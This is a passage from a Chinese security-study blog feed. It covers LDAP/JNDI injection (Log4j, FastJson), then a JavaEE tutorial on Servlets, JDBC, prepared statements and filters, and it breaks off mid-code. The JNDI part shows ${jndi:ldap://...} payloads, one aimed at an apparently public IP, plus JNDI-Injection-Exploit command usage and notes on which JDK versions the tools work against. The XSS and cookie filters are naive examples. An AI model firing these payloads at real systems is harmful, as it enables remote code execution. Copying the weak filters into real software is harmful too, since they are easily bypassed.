提供了一些常用的操作，包括：</p><ol><li>搜索（Search）：根据特定的条件在目录中搜索数据。</li><li>添加（Add）：向目录中添加新的数据项。</li><li>修改（Modify）：修改目录中的数据项。</li><li>删除（Delete）：从目录中删除数据项。</li></ol><p>LDAP 还具有灵活的权限控制和身份认证机制，可以确保只有经过授权的用户能够访问和修改目录中的数据。</p><h1 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h1><p>经典的JNDI注入漏洞：</p><p>Log4j 2.x 中的 JNDI 注入漏洞LDAP，允许攻击者通过特制的日志消息进行远程代码执行。在这种情况下，攻击者可以利用恶意构造的 JNDI上下文注入，执行恶意的Java代码。</p><p>上下文注入：</p><ol><li>在某些情况下，应用程序会通过用户提供的数据构建 JNDI 上下文（InitialContext）。</li><li>如果应用程序在构建上下文时没有充分验证和过滤用户提供的数据，攻击者可能会尝试通过构造特殊的输入来注入恶意的 JNDI 对象。如：${jndi:ldap:&#x2F;&#x2F;47.94.236.117:1389&#x2F;uyhyw6}</li></ol><p>FastJson JNDI 注入漏洞（JSON ）</p><ol><li>FastJson 在解析 JSON 数据时，会将 JSON 字符串转换为 Java 对象。</li><li>攻击者可以通过构造恶意的 JSON 字符串，包含特殊的 JSON 注释和 FastJson 的特性，来触发漏洞。攻击者构造的 JSON 数据可能包含特殊的注释和 FastJson 的特性，以触发漏洞并执行恶意代码。</li><li>远程代码执行：由于漏洞存在，攻击者可能成功执行远程代码，导致服务器上的不安全操作。</li></ol><p>JNDI注入教程：<a href="https://blog.csdn.net/ory001/article/details/121879748">https://blog.csdn.net/ory001/article/details/121879748</a></p><h1 id="JNDI注入工具"><a href="#JNDI注入工具" class="headerlink" title="JNDI注入工具"></a>JNDI注入工具</h1><h2 id="JNDIExploit-2-0-SNAPSHOT"><a href="#JNDIExploit-2-0-SNAPSHOT" class="headerlink" title="JNDIExploit-2.0-SNAPSHOT"></a>JNDIExploit-2.0-SNAPSHOT</h2><p>E:\web\tools\ONE-FOX集成工具箱_V8公开版_by狐狸\gui_scan\jndi&gt;java -jar JNDIExploit-2.0-SNAPSHOT.jar</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;notepad&quot; -A 192.168.85.128</span><br><span class="line">                                                        要执行的命令      服务器ip</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/bb6d7e87df26a5334f36e2b133ccf50e.png" alt="img"></p><p>复制生成的链接，构造 payload 如下，令 url 中 code 等于下值然后访问，即可成功执行命令。</p><p><code>$&#123;jndi:ldap://192.168.85.128:1389/hy5qgm&#125;</code></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/8f824c31ff071236b7e3db47b9feadc9.png" alt="img"></p><h2 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h2><h2 id="工具相关问题"><a href="#工具相关问题" class="headerlink" title="工具相关问题"></a>工具相关问题</h2><p>发现 jdk高版本会影响rmi和ldap的利用（marshalsec针对ldap有高版本绕过）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/d57a2e030e490fd3cd65cf97994d42df.png" alt="img"></p><p>LDAP - marshalsec工具</p><ul><li>JDK 17</li><li>11版本</li><li>8u362</li><li>8U112 都可以</li></ul><p>RMI marshalsec工具</p><ul><li>JDK 17版本 无法调用</li><li>11版本无法调用</li><li>8u362 无法执行</li><li>8U112 可以</li></ul><p>LDAP - jndi-inject工具</p><ul><li>JDK 17版本 无法调用</li><li>11版本无法调用</li><li>8u362 无法执行</li><li>8U112 可以</li></ul><p>RMI jndi-inject工具</p><ul><li>JDK 17版本 无法调用</li><li>11版本无法调用</li><li>8u362 无法执行</li><li>8U112 可以</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVAEE</title>
      <link href="/2025/05/27/JAVAEE/"/>
      <url>/2025/05/27/JAVAEE/</url>
      
        <content type="html"><![CDATA[<h1 id="创建javaee项目"><a href="#创建javaee项目" class="headerlink" title="创建javaee项目"></a>创建javaee项目</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229093752187.png" alt="image-20241229093752187"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229093905923.png" alt="image-20241229093905923"></p><p>创建新项目时可以删除的内容：</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241230165822829.png" alt="image-20241230165822829"></p><h1 id="Servlet-路由-周期"><a href="#Servlet-路由-周期" class="headerlink" title="Servlet&amp;路由&amp;周期"></a>Servlet&amp;路由&amp;周期</h1><p><a href="https://blog.csdn.net/yxmoar/article/details/109889006">https://blog.csdn.net/yxmoar/article/details/109889006</a></p><h2 id="什么是Servlet"><a href="#什么是Servlet" class="headerlink" title="什么是Servlet"></a>什么是Servlet</h2><p>Servlet是运行在Web服务器或应用服务器上的程序，它是作为来自<strong>Web浏览器</strong>或其他HTTP客户端的请求和<strong>HTTP服务器</strong>上的<strong>数据库或应用程序</strong>之间的<strong>中间层</strong>。使用Servlet可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。本章内容详细讲解了web开发的相关内容以及servlet相关内容的配置使用，是JAVAEE开发的重中之重。</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229122630025.png" alt="image-20241229122630025"></p><h2 id="Servlet-API"><a href="#Servlet-API" class="headerlink" title="Servlet API"></a>Servlet API</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229122712654.png" alt="image-20241229122712654"></p><h2 id="创建一个类继承HttpServlet"><a href="#创建一个类继承HttpServlet" class="headerlink" title="创建一个类继承HttpServlet"></a>创建一个类继承HttpServlet</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229123431220.png" alt="image-20241229123431220"></p><h2 id="web-xml配置映射关系"><a href="#web-xml配置映射关系" class="headerlink" title="web.xml配置映射关系"></a>web.xml配置映射关系</h2><p>具体参考：<a href="https://blog.csdn.net/weixin_52937170/article/details/142183673">https://blog.csdn.net/weixin_52937170/article/details/142183673</a></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229123218279.png" alt="image-20241229123218279"></p><p>当访问index时，经过路由配置访问到IndexServlet，由于是GET请求，触发了doGet方法（类似于反序列化的魔术方法）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229123558294.png" alt="image-20241229123558294"></p><blockquote><p>类似的 触发doPost方法：</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229124530349.png" alt="image-20241229124530349"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229124503897.png" alt="image-20241229124503897"></p></blockquote><p>还可以使用@WebServlet注解来配置Servlet路由（此时只需要在Servlet类前加一个@WebServlet，）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229125056350.png" alt="image-20241229125056350"></p><p>web.xml不需要配置，但是需要保留web-app标签结构</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229125108197.png" alt="image-20241229125108197"></p><p>此时也能够正常识别路由信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229125228202.png" alt="image-20241229125228202"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229125235146.png" alt="image-20241229125235146"></p><h2 id="Servlet生命周期"><a href="#Servlet生命周期" class="headerlink" title="Servlet生命周期"></a>Servlet生命周期</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229123950802.png" alt="image-20241229123950802"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229125530421.png" alt="image-20241229125530421"></p><p>这些方法也类似于反序列化魔术方法</p><h2 id="处理接收和回显"><a href="#处理接收和回显" class="headerlink" title="处理接收和回显"></a>处理接收和回显</h2><p><strong>HttpServletRequest（HTTP请求的信息）</strong></p><blockquote><ul><li><strong>ServletRequest的子接口</strong>：**<code>HttpServletRequest</code><strong>是</strong><code>ServletRequest</code>**接口的子接口，提供了用于处理HTTP请求的额外功能。</li><li><strong>getParameter(name)</strong>：通过参数名获取请求中的值。返回一个**<code>String</code>**，表示与给定参数名相对应的单个值。</li><li><strong>getParameterValues(name)</strong>：通过参数名获取请求中的多个值。返回一个**<code>String[]</code>**，表示与给定参数名相对应的多个值。</li></ul></blockquote><p><strong>HttpServletResponse（HTTP响应的信息）</strong></p><blockquote><ul><li><strong>ServletResponse的子接口</strong>：**<code>HttpServletResponse</code><strong>是</strong><code>ServletResponse</code>**接口的子接口，提供了用于处理HTTP响应的额外功能。</li><li><strong>setCharacterEncoding()</strong>：设置响应的字符编码格式。通常用于确保正确的文本输出。</li><li><strong>setContentType()</strong>：设置响应内容的类型和编码。常用于指定输出的数据类型，如HTML、JSON等。</li><li><strong>getWriter()</strong>：获取一个**<code>PrintWriter</code>**字符输出流，用于向客户端发送文本数据。</li><li><strong>PrintWriter</strong>：**<code>PrintWriter</code>**是用于向客户端输出字符数据的类，可以接受各种数据类型，然后将其转换为文本并发送到客户端。</li></ul></blockquote><h1 id="连接数据库-JDBC-Mybatis-库"><a href="#连接数据库-JDBC-Mybatis-库" class="headerlink" title="连接数据库-JDBC&amp;Mybatis&amp;库"></a>连接数据库-JDBC&amp;Mybatis&amp;库</h1><p><a href="https://blog.csdn.net/xiaozhezhe0470/article/details/105420763">https://blog.csdn.net/xiaozhezhe0470/article/details/105420763</a></p><p>三种连接数据库的方法：jdbc mybatis hibernate</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229104828630.png" alt="image-20241229104828630"></p><blockquote><p>现在用的最多的是mybatis</p></blockquote><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p><a href="https://www.jianshu.com/p/ed1a59750127">https://www.jianshu.com/p/ed1a59750127</a></p><p>原生数据库开发，是由java提供的统一API接口<br>数据库驱动：由各个数据库厂商提供，用于访问数据库的jar包，遵循JDBC接口</p><h3 id="下载jar"><a href="#下载jar" class="headerlink" title="下载jar"></a>下载jar</h3><p>下载地址：<a href="https://mvnrepository.com/">https://mvnrepository.com/</a></p><p>搜索相应的数据库（比如这里是mysql），选择版本，下载jar包</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229131504593.png"></p><h3 id="引用封装jar"><a href="#引用封装jar" class="headerlink" title="引用封装jar"></a>引用封装jar</h3><p>在目录下创建一个lib文件夹，将jar包放进去</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229131711166.png" alt="image-20241229131711166"></p><p>添加为库</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229131908194.png" alt="image-20241229131908194"></p><h3 id="注册数据库驱动"><a href="#注册数据库驱动" class="headerlink" title="注册数据库驱动"></a>注册数据库驱动</h3><p>新建一个java文件，类似于php中的连接数据库文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229132546097.png" alt="image-20241229132546097"></p><blockquote><p>出现错误时可以用IDEA自动更正</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229132953605.png" alt="image-20241229132953605"></p><p>如果存在导包问题，可以直接导入 import java.sql.*;</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229135100697.png" alt="image-20241229135100697"></p></blockquote><h3 id="建立数据库连接"><a href="#建立数据库连接" class="headerlink" title="建立数据库连接"></a>建立数据库连接</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义数据库连接的URL，格式为：jdbc:mysql://host:port/database</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/dome01&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用DriverManager获取数据库连接</span></span><br><span class="line">            <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 打印数据库连接信息</span></span><br><span class="line">            System.out.println(connection);</span><br></pre></td></tr></table></figure><p>成功连接上</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229133155727.png" alt="image-20241229133155727"></p><blockquote><p>如果密码失败（连接不上的情况）会产生报错</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229133228367.png" alt="image-20241229133228367"></p></blockquote><h3 id="创建Statement执行sql"><a href="#创建Statement执行sql" class="headerlink" title="创建Statement执行sql"></a>创建Statement执行sql</h3><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229134611911.png" alt="image-20241229134611911"></p><ul><li><strong><code>connection.createStatement();</code>：</strong> 在**<code>Connection</code><strong>对象上调用</strong><code>createStatement</code><strong>方法，创建一个</strong><code>Statement</code><strong>对象。</strong><code>Statement</code><strong>对象用于执行SQL语句，它可以执行静态的SQL查询、更新、删除等操作。</strong><code>createStatement</code><strong>方法返回一个新的</strong><code>Statement</code>**对象。</li><li>创建一个**<code>Statement</code><strong>对象，然后使用该对象执行给定的SQL查询语句，将查询结果存储在一个</strong><code>ResultSet</code><strong>对象中。这样，您可以通过遍历</strong><code>ResultSet</code>**来检索和处理查询的结果集中的数据。</li></ul><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229133738562.png" alt="image-20241229133738562"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229133721304.png" alt="image-20241229133721304"></p><h3 id="ResultSet对结果进行提取"><a href="#ResultSet对结果进行提取" class="headerlink" title="ResultSet对结果进行提取"></a>ResultSet对结果进行提取</h3><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229134437962.png" alt="image-20241229134437962"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229134255730.png" alt="image-20241229134255730"></p><p>和数据库里的内容对应</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229134413210.png" alt="image-20241229134413210"></p><h1 id="安全修复SQL注入：JDBC-SQL预编译"><a href="#安全修复SQL注入：JDBC-SQL预编译" class="headerlink" title="安全修复SQL注入：JDBC-SQL预编译"></a>安全修复SQL注入：JDBC-SQL预编译</h1><p>原理：提前编译好执行逻辑，你注入的语句不会改变原有逻辑</p><ol><li><strong>预编译写法：</strong> <strong><code>safesql</code></strong> 是一个预编译的 SQL 查询语句，其中 <strong><code>?</code></strong> 是一个占位符，表示将在执行时动态替换。</li><li><strong>使用 <code>PreparedStatement</code>：</strong> <strong><code>PreparedStatement</code></strong> 是 <strong><code>Statement</code></strong> 的子接口，用于执行预编译的 SQL 语句。通过调用 <strong><code>connection.prepareStatement(safesql)</code></strong> 创建一个 <strong><code>PreparedStatement</code></strong> 对象。</li><li><strong>设置参数：</strong> 使用 <strong><code>setXXX</code></strong> 方法设置占位符的值。在这里，使用 <strong><code>setInt(1, id)</code></strong> 将 <strong><code>id</code></strong> 的值设置到第一个占位符上。这种方式防止了 SQL 注入攻击，因为参数值是通过预编译的方式传递的，而不是通过直接拼接字符串。</li><li><strong>执行查询：</strong> 调用 <strong><code>executeQuery()</code></strong> 执行查询，得到 <strong><code>ResultSet</code></strong> 对象。</li><li><strong>处理结果集：</strong> 根据业务需要，处理查询结果集的数据。</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 预编译写法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">safesql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM news WHERE id=?&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用PreparedStatement</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(safesql)) &#123;</span><br><span class="line">    <span class="comment">// 设置参数，防止SQL注入攻击</span></span><br><span class="line">    preparedStatement.setInt(<span class="number">1</span>, id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行查询</span></span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> preparedStatement.executeQuery();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理结果集...</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相比较于直接拼接 SQL 语句的方式，预编译语句提供了更好的安全性，可以防止SQL注入攻击。在使用预编译语句时，务必通过参数设置的方式传递值，而不要直接拼接值到 SQL 语句中。</p><h1 id="过滤器Filter"><a href="#过滤器Filter" class="headerlink" title="过滤器Filter"></a>过滤器Filter</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Filter被称为过滤器，过滤器实际上就是对Web资源进行拦截，做一些处理后再交给下一个过滤器或Servlet处理，通常都是用来拦截request进行处理的，也可以对返回的 response进行拦截处理。开发人员利用filter技术，可以实现对所有Web资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。</p><p>（考虑跟安全相关的-内存马）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229141801466.png" alt="image-20241229141801466"></p><blockquote><p>简单来说，平常的马是处于Servlet代码层面中，会以代码文件呈现，而内存马处于Listener和Filter层面中</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229143655084.png" alt="image-20241229143655084"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229143650231.png" alt="image-20241229143650231"></p><h2 id="过滤器来进行对xss过滤"><a href="#过滤器来进行对xss过滤" class="headerlink" title="过滤器来进行对xss过滤"></a>过滤器来进行对xss过滤</h2><p>TestServlet文件（用于接受参数code，并返回code的值到客户端）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.filterdemo1.servlet;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;---------doGet&quot;</span>);</span><br><span class="line">        String code=req.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">        PrintWriter out=resp.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;这是GET请求的数据&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;code: &quot;</span>+code+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XssFilter文件（实现Filter接口中的方法）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.filterdemo1.filter;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebFilter(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XssFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//中间件启动后就自动运行,无需访问路由</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;xss开启过滤&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//中间件关闭后就自动运行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;xss销毁过滤&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//doFilter 访问路由触发的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;xss正在过滤&quot;</span>);</span><br><span class="line">        <span class="comment">//过滤代码就应该在放行前</span></span><br><span class="line">        <span class="comment">//如果符合就放行，不符合就过滤（拦截）</span></span><br><span class="line">        <span class="comment">//XSS过滤 接受参数值 如果有攻击payload 就进行拦截</span></span><br><span class="line">        <span class="comment">// 接受参数值 如果没有攻击payload 就进行放行</span></span><br><span class="line">        HttpServletRequest request= (HttpServletRequest) servletRequest;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!code.contains(<span class="string">&quot;&lt;script&gt;&quot;</span>))&#123; <span class="comment">//没有攻击payload</span></span><br><span class="line">            <span class="comment">//放行</span></span><br><span class="line">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;存在XSS攻击&quot;</span>);</span><br><span class="line">            <span class="comment">//继续拦截</span></span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>要注意这里的TestServlet和XssFilter的路由不同，一个是@WebServlet(“&#x2F;test”)，一个是@WebFilter(“&#x2F;test”)</p></blockquote><p>中间件启动后会自动运行init，所以控制台输出xss开启过滤</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229162734971.png" alt="image-20241229162734971"></p><p>TestServlet的访问路由为test，访问test文件，触发doFilter方法，控制台打印xss正在过滤</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229162816566.png" alt="image-20241229162816566"></p><p>当我们GET方式传递code参数&#x3D;1，先调用filter再调用Servlet，所以先调用XssFilter中的doFilter方法，打印xss正在过滤；再调用TestServlet中的doGet方法，控制台打印———–doGet</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229162928260.png" alt="image-20241229162928260"></p><p>当我们GET方式传递<code>code=&lt;script&gt;alert(1)&lt;/script&gt;</code>攻击代码，由于XssFilter中检测到了<code>&lt;script&gt;</code>关键字，触发过滤，打印存在XSS攻击</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229163433306.png" alt="image-20241229163433306"></p><p>由于XssFilter中没有放行，因此TestServlet中的doGet方法不会被调用</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229163319970.png" alt="image-20241229163319970"></p><p>当我们停止时，自动调用了XssFilter中的destroy方法</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241229163658842.png" alt="image-20241229163658842"></p><h2 id="过滤器实现cookie身份验证"><a href="#过滤器实现cookie身份验证" class="headerlink" title="过滤器实现cookie身份验证"></a>过滤器实现cookie身份验证</h2><p>检测客户端的cookie的user值是否为admin</p><p>AdminServlet文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.filterdemo1.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/admin&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdminServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;欢迎进入管理员页面&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AdminFilter文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.filterdemo1.filter;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebFilter(&quot;/admin&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdminFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;admin身份检测开启&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;admin身份检测销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        System.out.println(<span class="string">&quot;admin身份检测进行&quot;</span>);</span><br><span class="line">        <span class="comment">//检测Cookie过滤</span></span><br><span class="line">        HttpServletRequest request= (HttpServletRequest) servletRequest;</span><br><span class="line">        Cookie[] cookies=request.getCookies();</span><br><span class="line">        <span class="comment">//对Cookie进行遍历获取</span></span><br><span class="line">        <span class="keyword">for</span>(Cookie c:cookies)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cName</span> <span class="operator">=</span> c.getName();<span class="comment">//获取cookie名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cValue</span> <span class="operator">=</span> c.getValue();<span class="comment">//获取cookie值</span></span><br><span class="line">            System.out.println(cName);</span><br><span class="line">            System.out.println(cValue);</span><br><span class="line">            <span class="keyword">if</span>(cName.contains(<span class="string">&quot;user&quot;</span>) &amp;&amp; cValue.contains(<span class="string">&quot;admin&quot;</span>))&#123;</span><br><span class="line">                <span class="comment">// filterChain 是一个 FilterChain 对象，代表过滤器链。</span></span><br><span class="line">                <span class="comment">// doFilter() 方法用于将请求和响应对象传递给过滤器链中的下一个过滤器或目标资源。</span></span><br><span class="line">                <span class="comment">// 即当前过滤通过</span></span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;<span 